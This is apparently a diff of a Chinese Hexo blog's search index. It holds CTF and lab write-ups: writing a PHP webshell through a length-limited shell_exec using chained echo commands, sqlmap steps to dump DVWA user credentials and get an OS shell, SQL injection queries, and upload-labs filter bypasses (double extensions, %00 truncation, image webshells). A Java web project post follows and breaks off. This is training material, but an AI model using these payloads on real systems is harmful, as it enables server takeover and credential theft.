+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
+    phpinfo();
+&#125;
+</code></pre>
+
+
+
+<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
+<p>实验目的</p>
+<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
+    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>限制了参数1的字符长度为15</p>
+<p>然后将传递的参数放到shell_exec中执行</p>
+<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
+<p>所以想要够的payload的为</p>
+<pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre>
+
+<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
+<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" alt="muma.png"></p>
+<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
+<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
+<p>例如下面</p>
+<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" alt="echo.png"></p>
+<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
+<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" alt="yanzheng.png"></p>
+<p>下面就可以做这个题目了</p>
+<pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
+?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre>
+
+<p>之后访问1.php提交参数，获取想要的内容。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>cmd</tag>
+      </tags>
   </entry>
   <entry>
     <title>redis</title>
@@ -3530,6 +3530,35 @@ cmdline.execute(<span class="hljs-string">&quot;scrapy crawl 爬虫名字&quot;<
       </categories>
       <tags>
         <tag>spider</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap</title>
+    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
+
+<p>第一步:</p>
+<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
+<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
+<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
+<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
+//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
+<p>第六步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
+<p>group by *</p>
+<p>利用内置函数暴数据库信息</p>
+<p>version() 查看数据库版本</p>
+<p>database() 查看当前数据库名</p>
+<p>user() 查看当前用户</p>
+<p>查看表：</p>
+<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
+<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -4152,132 +4181,6 @@ print(flag)</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>sqlmap</title>
-    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
-
-<p>第一步:</p>
-<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
-<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
-<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
-<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
-//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
-<p>第六步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
-<p>group by *</p>
-<p>利用内置函数暴数据库信息</p>
-<p>version() 查看数据库版本</p>
-<p>database() 查看当前数据库名</p>
-<p>user() 查看当前用户</p>
-<p>查看表：</p>
-<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
-<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>upload-11-21</title>
-    <url>/2020/09/18/upload2/</url>
-    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>
-
-<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
-
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
-        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
-        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-
-<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
-<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
-<p>可以双写绕过，即<code>1.pphphp</code></p>
-<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
-    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
-    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
-    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
-        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;
-
-        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
-            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span>&#123;
-        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
-<p>这里用的<code>%00截断</code>，原理如下</p>
-<p><code>www.xxx.com/qq.jpg</code></p>
-<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
-<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" alt></p>
-<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
-<p>但是这里要使用 00的二进制形式</p>
-<p><img src="/2020/09/18/upload2/13.png" alt></p>
-<p><img src="/2020/09/18/upload2/13-1.png" alt></p>
-<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
-<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
-    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
-    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
-    fclose(<span class="hljs-variable">$file</span>);
-    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
-    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
-    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
-    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
-        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
-            <span class="hljs-keyword">break</span>;
-        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
-            <span class="hljs-keyword">break</span>;        
-        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
-            <span class="hljs-keyword">break</span>;
-        <span class="hljs-keyword">default</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
-        &#125;    
-        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
-&#125;</code></pre>
-
-<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
-<p><strong>图片木马的制作</strong></p>
-<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
-<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p>
-<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
-<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" alt></p>
-<p><strong>未完待续。。。</strong></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>双写绕过</tag>
-        <tag>00截断</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>uploads-labs</title>
     <url>/2020/09/16/uploads/</url>
     <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><span id="more"></span>
@@ -4528,6 +4431,103 @@ video/mp4
         <tag>大小写绕过</tag>
         <tag>.htaccess</tag>
         <tag>windows文件特性</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-11-21</title>
+    <url>/2020/09/18/upload2/</url>
+    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>
+
+<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
+
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
+        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
+        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+
+<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
+<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
+<p>可以双写绕过，即<code>1.pphphp</code></p>
+<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
+    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
+    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
+        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;
+
+        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
+            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
+<p>这里用的<code>%00截断</code>，原理如下</p>
+<p><code>www.xxx.com/qq.jpg</code></p>
+<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
+<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" alt></p>
+<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
+<p>但是这里要使用 00的二进制形式</p>
+<p><img src="/2020/09/18/upload2/13.png" alt></p>
+<p><img src="/2020/09/18/upload2/13-1.png" alt></p>
+<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
+<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
+    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
+    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
+    fclose(<span class="hljs-variable">$file</span>);
+    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
+    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
+    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
+    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
+        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
+            <span class="hljs-keyword">break</span>;        
+        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">default</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
+        &#125;    
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
+&#125;</code></pre>
+
+<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
+<p><strong>图片木马的制作</strong></p>
+<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
+<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p>
+<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
+<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" alt></p>
+<p><strong>未完待续。。。</strong></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>双写绕过</tag>
+        <tag>00截断</tag>
       </tags>
   </entry>
   <entry>
@@ -13713,6 +13713,1626 @@ service apache2 start</code></pre>
       <categories>
         <category>ctf</category>
       </categories>
+  </entry>
+  <entry>
+    <title>javaweb</title>
+    <url>/2022/03/30/javaweb/</url>
+    <content><![CDATA[<h1 id="Javaweb基础项目"><a href="#Javaweb基础项目" class="headerlink" title="Javaweb基础项目"></a>Javaweb基础项目</h1><p>学完 javaweb 做的小项目</p>
+<h2 id="综合案例需求与准备"><a href="#综合案例需求与准备" class="headerlink" title="综合案例需求与准备"></a>综合案例需求与准备</h2><p><strong>今日目标：</strong></p>
+<blockquote>
+<ul>
+<li>能够完成查询所有功能</li>
+<li>能够完成添加功能</li>
+<li>能够理解 BaseServlet 思想</li>
+<li>能够完成批量删除功能</li>
+<li>能够完成分页查询功能</li>
+<li>能够完成条件查询功能</li>
+</ul>
+</blockquote>
+<h3 id="1，功能介绍"><a href="#1，功能介绍" class="headerlink" title="1，功能介绍"></a>1，功能介绍</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825171411003.png" alt="image-20210825171411003"></p>
+<p>以上是我们在综合案例要实现的功能。对数据的除了对数据的增删改查功能外，还有一些复杂的功能，如 <code>批量删除</code>、<code>分页查询</code>、<code>条件查询</code> 等功能</p>
+<ul>
+<li><code>批量删除</code> 功能：每条数据前都有复选框，当我选中多条数据并点击 <code>批量删除</code> 按钮后，会发送请求到后端并删除数据库中指定的多条数据。</li>
+<li><code>分页查询</code> 功能：当数据库中有很多数据时，我们不可能将所有的数据展示在一页里，这个时候就需要分页展示数据。</li>
+<li><code>条件查询</code> 功能：数据库量大的时候，我们就需要精确的查询一些想看到的数据，这个时候就需要通过条件查询。</li>
+</ul>
+<p>这里的 <code>修改品牌</code> 和 <code>删除品牌</code> 功能在课程上不做讲解，留作同学来下的练习。</p>
+<h3 id="2，环境准备"><a href="#2，环境准备" class="headerlink" title="2，环境准备"></a>2，环境准备</h3><p>环境准备我们主要完成以下两件事即可</p>
